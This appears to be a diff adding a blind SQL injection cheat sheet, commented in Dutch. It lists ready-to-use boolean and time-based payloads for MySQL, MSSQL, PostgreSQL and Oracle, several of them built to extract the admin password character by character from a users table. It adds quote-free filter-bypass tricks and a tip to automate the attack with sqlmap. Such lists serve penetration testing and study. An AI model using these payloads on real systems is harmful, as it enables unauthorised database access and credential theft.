@@ -1,0 +1,25 @@
+# SQL Injection - Blind (Boolean + Time-Based)
+# === BOOLEAN BLIND (response verschil = true/false) ===
+# MySQL:
+' AND SUBSTRING(version(),1,1)='5'-- -
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>96-- -
+# MSSQL:
+' AND SUBSTRING(@@version,1,1)='M'-- -
+# PostgreSQL:
+' AND (SELECT SUBSTRING(version(),1,1))='P'-- -
+# === TIME-BASED BLIND (geen zichtbaar verschil) ===
+# MySQL:
+' AND IF(1=1,SLEEP(5),0)-- -
+' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>96,SLEEP(5),0)-- -
+# MSSQL:
+'; WAITFOR DELAY '0:0:5'-- -
+'; IF (SELECT ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)))>96 WAITFOR DELAY '0:0:5'-- -
+# PostgreSQL:
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+'; SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+# Oracle:
+' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END)-- -
+# === PostgreSQL specials ===
+# CHR() bypass (geen quotes nodig): CHR(65)||CHR(66) = 'AB'
+# Dollar-quoted strings: $$string$$ = 'string'
+# Tip: Automatiseer met Python script of sqlmap
